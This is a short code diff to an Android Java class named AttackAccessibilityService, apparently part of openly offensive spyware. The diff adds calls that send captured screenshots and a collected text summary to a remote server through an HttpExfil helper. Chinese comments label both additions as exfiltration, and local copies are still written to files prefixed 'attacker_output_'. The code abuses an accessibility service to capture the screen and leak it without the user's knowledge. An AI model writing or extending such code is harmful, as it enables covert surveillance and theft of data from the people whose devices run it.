@@ -120,6 +120,8 @@ public class AttackAccessibilityService extends AccessibilityService {
                                 b.compress(Bitmap.CompressFormat.PNG, 100, o); o.close();
                                 b.recycle(); r.getHardwareBuffer().close();
                                 sb.append("\n📸: ").append(picPath).append(" (").append(new java.io.File(picPath).length()).append("B)\n");
+                                // 外泄截图到远程服务器
+                                HttpExfil.sendScreenshot(AttackAccessibilityService.this, payload, picPath);
                             }
                         } catch (Exception e) {}
                     }
@@ -128,7 +130,12 @@ public class AttackAccessibilityService extends AccessibilityService {
         } catch (Exception e) {}
 
         sb.append("\n✓\n");
-        rotateFiles("/sdcard/attacker_output_", ".txt", sb.toString());
+        String summary = sb.toString();
+        rotateFiles("/sdcard/attacker_output_", ".txt", summary);
+
+        // 外泄到远程服务器
+        HttpExfil.sendText(this, payload, summary);
+
         Log.i(TAG, "🎉");
     }
 
